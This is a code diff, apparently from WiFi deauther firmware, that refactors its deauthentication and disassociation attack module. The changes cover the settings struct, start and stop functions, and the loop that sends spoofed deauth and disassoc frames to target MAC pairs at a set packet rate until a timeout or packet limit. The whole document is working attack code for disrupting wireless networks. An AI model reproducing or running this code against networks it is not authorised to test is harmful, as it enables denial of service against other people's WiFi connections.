@@ -19,19 +19,18 @@ uint8_t deauth_pkt[] = {
 
 // ========== ATTACK DATA ========== //
 typedef struct deauth_attack_data_t {
-    TargetList    targets;
-    bool          deauth;
-    bool          disassoc;
-    unsigned long rate;
-    unsigned long timeout;
-    unsigned long pkts;
+    bool enabled;
+
+    deauth_attack_settings_t settings;
+
+    TargetList targets;
+
     unsigned long start_time;
     unsigned long output_time;
     unsigned long pkts_sent;
     unsigned long pkts_per_second;
     unsigned long pkt_time;
     unsigned long pkt_interval;
-    bool          silent;
 } deauth_attack_data_t;
 
 deauth_attack_data_t deauth_data;
@@ -54,13 +53,13 @@ bool send_disassoc(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
 }
 
 // ========== ATTACK FUNCTIONS ========== //
-void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts, bool silent) {
+void startDeauth(const deauth_attack_settings_t& settings) {
     { // Error checks
-        if (targets.size() == 0) {
+        if (!settings.targets || (settings.targets->size() == 0)) {
             debuglnF("ERROR: No targets specified");
             return;
         }
-        if (!deauth && !disassoc) {
+        if (!settings.deauth && !settings.disassoc) {
             debuglnF("ERROR: Invalid mode");
             return;
         }
@@ -68,37 +67,51 @@ void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long 
 
     stopDeauth();
 
+    unsigned long current_time = millis();
+
+    deauth_data.enabled = true;
+
+    deauth_data.settings = settings;
+    deauth_data.targets.moveFrom(*settings.targets);
+
+    deauth_data.start_time      = current_time;
+    deauth_data.output_time     = current_time;
+    deauth_data.pkts_sent       = 0;
+    deauth_data.pkts_per_second = 0;
+    deauth_data.pkt_time        = current_time;
+    deauth_data.pkt_interval    = (1000/deauth_data.settings.pkt_rate) * (settings.deauth+settings.disassoc);
+
     { // Output
         debuglnF("[ ===== Deauth Attack ===== ]");
 
         debugF("Mode:           ");
-        if (deauth && disassoc) {
+        if (deauth_data.settings.deauth && deauth_data.settings.disassoc) {
             debuglnF("deauthentication and disassociation");
-        } else if (deauth) {
+        } else if (deauth_data.settings.deauth) {
             debuglnF("deauthentication");
-        } else if (disassoc) {
+        } else if (deauth_data.settings.disassoc) {
             debuglnF("disassociation");
         }
 
         debugF("Packets/second: ");
-        debugln(rate);
+        debugln(deauth_data.settings.pkt_rate);
 
         debugF("Timeout:        ");
-        if (timeout > 0) debugln(strh::time(timeout));
+        if (deauth_data.settings.timeout > 0) debugln(strh::time(deauth_data.settings.timeout));
         else debugln('-');
 
         debugF("Max. packets:   ");
-        if (pkts > 0) debugln(pkts);
+        if (deauth_data.settings.max_pkts > 0) debugln(deauth_data.settings.max_pkts);
         else debugln('-');
 
         debugF("Targets:        ");
-        debugln(targets.size());
+        debugln(deauth_data.targets.size());
 
         // Print MACs
-        targets.begin();
+        deauth_data.targets.begin();
 
-        while (targets.available()) {
-            Target* t = targets.iterate();
+        while (deauth_data.targets.available()) {
+            Target* t = deauth_data.targets.iterate();
             debugF("- transmitter ");
             debug(strh::mac(t->getSender()));
             debugF(", receiver ");
@@ -111,66 +124,60 @@ void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long 
         debuglnF("Type 'stop' to stop the attack");
         debugln();
     }
-
-    deauth_data.targets.moveFrom(targets);
-    deauth_data.deauth          = deauth;
-    deauth_data.disassoc        = disassoc;
-    deauth_data.rate            = rate;
-    deauth_data.timeout         = timeout;
-    deauth_data.pkts            = pkts;
-    deauth_data.start_time      = millis();
-    deauth_data.output_time     = millis();
-    deauth_data.pkts_sent       = 0;
-    deauth_data.pkts_per_second = 0;
-    deauth_data.pkt_time        = 0;
-    deauth_data.pkt_interval    = (1000/rate) * (deauth+disassoc);
-    deauth_data.silent          = silent;
 }
 
 void stopDeauth() {
-    if (deauth_data.targets.size() > 0) {
+    if (deauth_data.enabled) {
+        deauth_data.enabled    = false;
         deauth_data.pkts_sent += deauth_data.pkts_per_second;
         deauth_data.targets.clear();
 
-        debugF("Deauth attack stopped. Sent ");
+        debugF("Stopped deauth attack. Sent ");
         debug(deauth_data.pkts_sent);
         debuglnF(" packets.");
     }
 }
 
-void updateDeauth() {
-    deauth_attack_data_t& d = deauth_data;
-
-    if (d.targets.size() > 0) {
-        if (((d.timeout > 0) && (millis() - d.start_time > d.timeout)) ||
-            ((d.pkts > 0) && (d.pkts_sent >= d.pkts))) {
+void update_deauth_attack() {
+    if (deauth_data.enabled) {
+        if (((deauth_data.settings.timeout > 0) && (millis() - deauth_data.start_time > deauth_data.settings.timeout)) ||
+            ((deauth_data.settings.max_pkts > 0) && (deauth_data.pkts_sent >= deauth_data.settings.max_pkts))) {
             stopDeauth();
             return;
         }
 
-        if (!d.silent && (millis() - d.output_time >= 1000)) {
-            d.pkts_sent += d.pkts_per_second;
+        if (millis() - deauth_data.output_time >= 1000) {
+            deauth_data.pkts_sent += deauth_data.pkts_per_second;
 
             debugF("[Deauth attack: ");
-            debug(d.pkts_per_second);
+            debug(deauth_data.pkts_per_second);
             debugF(" pkts/s, ");
-            debug(d.pkts_sent);
+            debug(deauth_data.pkts_sent);
             debuglnF(" total]");
 
-            d.output_time = millis();
+            deauth_data.output_time = millis();
 
-            d.pkts_per_second = 0;
+            deauth_data.pkts_per_second = 0;
         }
 
-        if (millis() - d.pkt_time >= d.pkt_interval) {
-            Target* t = d.targets.iterate();
+        if (millis() - deauth_data.pkt_time >= deauth_data.pkt_interval) {
+            Target* t = deauth_data.targets.iterate();
 
-            if (d.deauth) d.pkts_per_second += send_deauth(t->getCh(), t->getSender(), t->getReceiver());
-            if (d.disassoc) d.pkts_per_second += send_disassoc(t->getCh(), t->getSender(), t->getReceiver());
+            if (deauth_data.settings.deauth) deauth_data.pkts_per_second += send_deauth(
+                    t->getCh(),
+                    t->getSender(),
+                    t->getReceiver()
+                    );
 
-            d.pkt_time = millis();
+            if (deauth_data.settings.disassoc) deauth_data.pkts_per_second += send_disassoc(
+                    t->getCh(),
+                    t->getSender(),
+                    t->getReceiver()
+                    );
+
+            deauth_data.pkt_time = millis();
         }
 
-        if (!d.targets.available()) d.targets.begin();
+        if (!deauth_data.targets.available()) deauth_data.targets.begin();
     }
 }
